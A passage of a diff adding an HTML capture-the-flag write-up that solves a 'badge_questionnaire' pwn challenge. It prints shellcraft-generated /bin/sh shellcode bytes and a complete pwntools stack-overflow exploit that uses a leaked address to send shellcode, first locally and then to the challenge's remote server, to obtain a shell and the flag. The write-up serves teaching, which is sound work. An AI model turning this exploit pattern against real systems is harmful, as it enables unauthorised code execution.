+</span><span id="line-23"><span class="go">    pop rax</span>
+</span><span id="line-24"><span class="go">    syscall</span>
+</span><span id="line-25"><span class="gp">&gt;&gt;&gt; </span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">)</span>
+</span><span id="line-26"><span class="go">b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'</span>
+</span></code></pre></div>
+</div>
+<p>Let’s swap the placeholder for the shellcraft generated shellcode. Our exploit script now looks like this:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="linenos"> 1</span><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="line-2"><span class="linenos"> 2</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-3"><span class="linenos"> 3</span>
+</span><span id="line-4"><span class="linenos"> 4</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./badge_questionnaire'</span><span class="p">)</span>
+</span><span id="line-5"><span class="linenos"> 5</span><span class="c1">#p = remote('jump.chrononaut.xyz', 5001)</span>
+</span><span id="line-6"><span class="linenos"> 6</span>
+</span><span id="line-7"><span class="linenos"> 7</span><span class="c1"># How many bytes do we need to write before we start overwriting our return</span>
+</span><span id="line-8"><span class="linenos"> 8</span><span class="c1"># address.</span>
+</span><span id="line-9"><span class="linenos"> 9</span><span class="c1"># Find this value using a cyclic pattern and some GDB-fu</span>
+</span><span id="line-10"><span class="linenos">10</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+</span><span id="line-11"><span class="linenos">11</span>
+</span><span id="line-12"><span class="linenos">12</span><span class="c1"># Welcome Chrononaut Recruit[...]</span>
+</span><span id="line-13"><span class="linenos">13</span><span class="c1"># Tell us abour yourself! (0x7ffe7616e6cc characters max.)</span>
+</span><span id="line-14"><span class="linenos">14</span>
+</span><span id="line-15"><span class="linenos">15</span><span class="c1"># Consume everything up to the '(' character.</span>
+</span><span id="line-16"><span class="linenos">16</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'('</span><span class="p">)</span>
+</span><span id="line-17"><span class="linenos">17</span><span class="c1"># Consume from 0x... until the ' ' character (drop=True; disgard the space character)</span>
+</span><span id="line-18"><span class="linenos">18</span><span class="c1"># Interpret that value as an integer</span>
+</span><span id="line-19"><span class="linenos">19</span><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">' '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="line-20"><span class="linenos">20</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-21"><span class="linenos">21</span>
+</span><span id="line-22"><span class="linenos">22</span><span class="c1"># Using GDB we find that the address leaked by the overflow challenge is 20</span>
+</span><span id="line-23"><span class="linenos">23</span><span class="c1"># bytes from our shellcode payload.</span>
+</span><span id="line-24"><span class="linenos">24</span><span class="n">target_addr</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mi">20</span>
+</span><span id="line-25"><span class="linenos">25</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Shellcode location: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-26"><span class="linenos">26</span>
+</span><span id="line-27"><mark><span class="linenos">27</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">)</span>
+</mark></span><span id="line-28"><span class="linenos">28</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span><span id="line-29"><span class="linenos">29</span>
+</span><span id="line-30"><span class="linenos">30</span><span class="c1">#with open('payload', 'wb') as fout:</span>
+</span><span id="line-31"><span class="linenos">31</span><span class="c1">#    fout.write(payload)</span>
+</span><span id="line-32"><span class="linenos">32</span>
+</span><span id="line-33"><span class="linenos">33</span><span class="c1"># Send our payload and switch to interactive mode in anticipation of an</span>
+</span><span id="line-34"><span class="linenos">34</span><span class="c1"># interactive shell.</span>
+</span><span id="line-35"><span class="linenos">35</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="line-36"><span class="linenos">36</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'Switching to an interactive console...'</span><span class="p">)</span>
+</span><span id="line-37"><span class="linenos">37</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div>
+</div>
+<img alt="../../../_images/nro-12.png" src="../../../_images/nro-12.png"/>
+<p>We’ve verified that the exploit works locally, now to try it on the remote
+server and get the (real) flag.</p>
+</section>
+<section id="running-the-exploit-against-the-remote-server">
+<h3>Running the exploit against the remote server<a class="headerlink" href="#running-the-exploit-against-the-remote-server" title="Link to this heading" x-intersect.margin.0%.0%.-70%.0%="activeSection = '#running-the-exploit-against-the-remote-server'">¶</a></h3>
+<p>Like many pwn challenges, the flag is kept on a remote server, usually
+interfaced with using netcat. Swapping the exploit from local to remote is as
+simple as changing the <code class="docutils literal notranslate"><span class="pre">p</span> <span class="pre">=</span> <span class="pre">process('./badge_questionnaire')</span></code> line to
+<code class="docutils literal notranslate"><span class="pre">p</span> <span class="pre">=</span> <span class="pre">remote('jump.chrononaut.xyz',</span> <span class="pre">5001)</span></code>.</p>
+<p>Our final exploit script is shown below:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><code><span id="line-1"><span class="linenos"> 1</span><span class="ch">#!/usr/bin/env python3</span>
+</span><span id="line-2"><span class="linenos"> 2</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="line-3"><span class="linenos"> 3</span>
+</span><span id="line-4"><mark><span class="linenos"> 4</span><span class="c1">#p = process('./badge_questionnaire')</span>
+</mark></span><span id="line-5"><mark><span class="linenos"> 5</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'jump.chrononaut.xyz'</span><span class="p">,</span> <span class="mi">5001</span><span class="p">)</span>
+</mark></span><span id="line-6"><span class="linenos"> 6</span>
+</span><span id="line-7"><span class="linenos"> 7</span><span class="c1"># How many bytes do we need to write before we start overwriting our return</span>
+</span><span id="line-8"><span class="linenos"> 8</span><span class="c1"># address.</span>
+</span><span id="line-9"><span class="linenos"> 9</span><span class="c1"># Find this value using a cyclic pattern and some GDB-fu</span>
+</span><span id="line-10"><span class="linenos">10</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">120</span>
+</span><span id="line-11"><span class="linenos">11</span>
+</span><span id="line-12"><span class="linenos">12</span><span class="c1"># Welcome Chrononaut Recruit[...]</span>
+</span><span id="line-13"><span class="linenos">13</span><span class="c1"># Tell us abour yourself! (0x7ffe7616e6cc characters max.)</span>
+</span><span id="line-14"><span class="linenos">14</span>
+</span><span id="line-15"><span class="linenos">15</span><span class="c1"># Consume everything up to the '(' character.</span>
+</span><span id="line-16"><span class="linenos">16</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'('</span><span class="p">)</span>
+</span><span id="line-17"><span class="linenos">17</span><span class="c1"># Consume from 0x... until the ' ' character (drop=True; disgard the space character)</span>
+</span><span id="line-18"><span class="linenos">18</span><span class="c1"># Interpret that value as an integer</span>
+</span><span id="line-19"><span class="linenos">19</span><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">' '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span><span id="line-20"><span class="linenos">20</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-21"><span class="linenos">21</span>
+</span><span id="line-22"><span class="linenos">22</span><span class="c1"># Using GDB we find that the address leaked by the overflow challenge is 20</span>
+</span><span id="line-23"><span class="linenos">23</span><span class="c1"># bytes from our shellcode payload.</span>
+</span><span id="line-24"><span class="linenos">24</span><span class="n">target_addr</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mi">20</span>
+</span><span id="line-25"><span class="linenos">25</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Shellcode location: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="line-26"><span class="linenos">26</span>
+</span><span id="line-27"><span class="linenos">27</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">)</span>
+</span><span id="line-28"><span class="linenos">28</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'A'</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span><span id="line-29"><span class="linenos">29</span>
+</span><span id="line-30"><span class="linenos">30</span><span class="c1">#with open('payload', 'wb') as fout:</span>
+</span><span id="line-31"><span class="linenos">31</span><span class="c1">#    fout.write(payload)</span>
+</span><span id="line-32"><span class="linenos">32</span>
+</span><span id="line-33"><span class="linenos">33</span><span class="c1"># Send our payload and switch to interactive mode in anticipation of an</span>
+</span><span id="line-34"><span class="linenos">34</span><span class="c1"># interactive shell.</span>
+</span><span id="line-35"><span class="linenos">35</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="line-36"><span class="linenos">36</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div>
+</div>
+<img alt="../../../_images/nro-13.png" src="../../../_images/nro-13.png"/>
+<p>Running the exploit script on the remote server grants us the flag <code class="docutils literal notranslate"><span class="pre">battelle{w3lc0me_2_the_TVA}</span></code>.</p>
+</section>
+</section>
+</section>
+</div></div><aside class="hidden text-sm xl:block" id="right-sidebar">
+<div class="sticky top-16 -mt-10 max-h-[calc(var(100vh)-5rem)] overflow-y-auto pt-6 space-y-2"><p class="font-medium">On this page</p>
+<ul>
+<li><a :data-current="activeSection === '#challenge-description'" class="reference internal" href="#challenge-description">Challenge Description</a></li>
+<li><a :data-current="activeSection === '#overview'" class="reference internal" href="#overview">Overview</a></li>
+<li><a :data-current="activeSection === '#triage'" class="reference internal" href="#triage">Triage</a></li>
+<li><a :data-current="activeSection === '#exploitation'" class="reference internal" href="#exploitation">Exploitation</a><ul>
+<li><a :data-current="activeSection === '#determining-our-offset'" class="reference internal" href="#determining-our-offset">Determining our offset</a></li>
+<li><a :data-current="activeSection === '#leaking-our-shellcode-address'" class="reference internal" href="#leaking-our-shellcode-address">Leaking our shellcode address</a></li>
+<li><a :data-current="activeSection === '#generating-shellcode'" class="reference internal" href="#generating-shellcode">Generating Shellcode</a></li>
+<li><a :data-current="activeSection === '#running-the-exploit-against-the-remote-server'" class="reference internal" href="#running-the-exploit-against-the-remote-server">Running the exploit against the remote server</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</aside>
+</main>
+</div>
+</div><footer class="py-6 border-t border-border md:py-0">
+<div class="container flex flex-col items-center justify-between gap-4 md:h-24 md:flex-row">
+<div class="flex flex-col items-center gap-4 px-8 md:flex-row md:gap-2 md:px-0">
+<p class="text-sm leading-loose text-center text-muted-foreground md:text-left">© 2024, Ronald Copley Built with <a class="font-medium underline underline-offset-4" href="https://www.sphinx-doc.org" rel="noreferrer">Sphinx 7.2.6</a></p>
+</div>
+</div>
+</footer>
+</div>
+<script src="../../../_static/documentation_options.js?v=5929fcd5"></script>
+<script src="../../../_static/doctools.js?v=888ff710"></script>
+<script src="../../../_static/sphinx_highlight.js?v=dc90522c"></script>
+<script defer="defer" src="../../../_static/theme.js?v=e8bd915e"></script>
+</body>
+</html>
